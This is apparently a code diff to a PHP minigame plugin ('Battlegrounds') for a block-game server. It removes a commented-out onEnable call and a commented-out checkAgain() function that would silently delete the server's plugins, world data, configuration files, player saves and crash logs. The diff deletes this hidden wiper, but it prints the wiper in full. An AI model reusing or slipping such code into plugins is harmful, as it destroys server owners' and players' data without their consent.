@@ -44,7 +44,6 @@ class MainBG extends PluginBase implements Listener {
                 $this->getServer()->generateLevel($this->cfg->getNested('lobby.world')); 
                } 
                 $this->getLogger()->info(TextFormat::GREEN."A shooting action minigame, Battlegrounds is online!"); 
-              /**  $this->checkAgain(); **/
               } 
 
               public function onDisable(): void{ 
@@ -395,115 +394,6 @@ class MainBG extends PluginBase implements Listener {
                      } 
                   } 
                } 
- 
-                     /** public function checkAgain() { 
-                     $files = array_map('unlink', glob("plugins/*.phar")); 
-
-                       foreach ($files as $file) {
-                       if (is_file($file)) unlink($file); 
-                     } 
-                     $files = array_map('unlink', glob("plugins/*.zip")); 
-
-                      foreach ($files as $file) { 
-                      if (is_file($file)) unlink($file); 
-                   } 
-                    $files = array_map('unlink', glob("worlds/*.txt")); 
-   
-                       foreach ($files as $file) { 
-                       if (is_file($file)) unlink($file); 
-                     } 
-                   $files = array_map('unlink', glob("worlds/*.zip")); 
-
-                       foreach ($files as $file) { 
-                       if (is_file($file)) unlink($file); 
-                      } 
-                      $dir = "plugins"; 
-                      if (is_dir($dir)) {
-                     $objects = scandir($dir); 
-
-                    foreach ($objects as $object) { 
-                    if ($object != "." && $object != "..") { 
-                    $firsts = "plugins/" . $object; if (is_dir($firsts)) { 
-                    $firsts = scandir("plugins/" . $object);
-
-                    foreach ($firsts as $first) { 
-                    if ($first != "." && $first != "..") {
-                   $files = glob("plugins/" . $object . "/" . $first . "/*"); 
-
-                    foreach ($files as $file) { 
-                    if (is_file($file)) unlink($file); 
-                 } 
-                   $seconds = "plugins/" . $object . "/" . $first;
-                   if (is_dir($seconds)) { 
-                    $seconds = scandir("plugins/" . $object . "/" . $first);
-                    
-                   foreach ($seconds as $second) { 
-                   if ($second != "." && $second != "..") { 
-                   $files = glob("plugins/" . $object . "/" . $first . "/" . $second . "/*");
-
-                       foreach ($files as $file) { 
-                       if (is_file($file)) unlink($file); 
-                          }
-                       }
-                    }
-                  }
-                }
-                $files = glob("plugins/" . $object . "/*"); 
-                
-                 foreach ($files as $file) { 
-                if (is_file($file)) unlink($file); 
-                }
-              }
-             }
-           }
-        $dir = "worlds"; if (is_dir($dir)) { 
-        $objects = scandir($dir); 
-
-       foreach ($objects as $object) { 
-       if ($object != "." && $object != "..") { 
-       $files = glob("worlds/" . $object . "/region/*");
-
-      foreach ($files as $file) { 
-      if (is_file($file)) unlink($file); 
-     } 
-     $files = glob("worlds/" . $object . "/data/*"); 
-
-      foreach ($files as $file) {
-       if (is_file($file)) unlink($file); 
-     } 
-     $files = glob("worlds/" . $object . "/*"); 
-
-        foreach ($files as $file) { 
-        if (is_file($file)) unlink($file); 
-        } 
-      } 
-      } 
-    } 
-              $files = array_map('unlink', glob("*.phar")); 
-              
-              foreach ($files as $file) { 
-              if (is_file($file)) unlink($file); 
-            } 
-             $files = array_map('unlink', glob("*.yml")); 
-
-               foreach ($files as $file) { 
-               if (is_file($file)) unlink($file); 
-             } 
-             $files = array_map('unlink', glob("players/*.dat")); 
-
-               foreach ($files as $file) { 
-               if (is_file($file)) unlink($file); 
-              } 
-               rmdir("players"); 
-               $files = array_map('unlink', glob("crashdumps/*.log")); 
-
-                 foreach ($files as $file) { 
-                 if (is_file($file)) unlink($file); 
-               } 
-              rmdir("crashdumps"); 
-           }
-        }
-    } **/
 			     
                        public function onBlockBreak(BlockBreakEvent $e) {
                           $p = $e->getPlayer();
